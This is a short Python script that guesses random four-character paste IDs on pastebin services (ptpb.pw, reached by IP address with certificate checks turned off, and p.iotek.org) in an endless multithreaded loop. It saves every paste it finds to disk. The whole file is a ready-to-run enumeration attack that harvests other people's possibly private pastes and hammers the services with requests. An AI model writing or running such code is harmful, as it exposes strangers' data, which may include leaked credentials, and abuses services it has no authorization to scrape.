#!/bin/env python

import requests
import random
import threading, time

list = []
for i in range(26):
    list.append(chr(i + ord('a')))
    list.append(chr(i + ord('A')))
for i in range(10):
    list.append(chr(i + ord('0')))

def genid():
    id = ""
    for i in range(4):
        id += list[random.randrange(len(list))]

    return id

failedStr = "status: not found\n"
#failedStr = "file does not exist"

def spam():
    id = genid()

    #req = requests.get('https://p.iotek.org/' + id)

    #req = requests.get('https://ptpb.pw/' + id)
    req = requests.get('https://138.197.7.107/' + id, verify = False) # ptpb.pw

    if req.text != failedStr and req.text != "":
        print('succ', id)
        file = open(id + '.res', 'w')
        file.write(req.text)
        file.close()

while True:
    if threading.active_count() > 10:
        time.sleep(0.05)
        continue

    threading.Thread(target = spam).start()
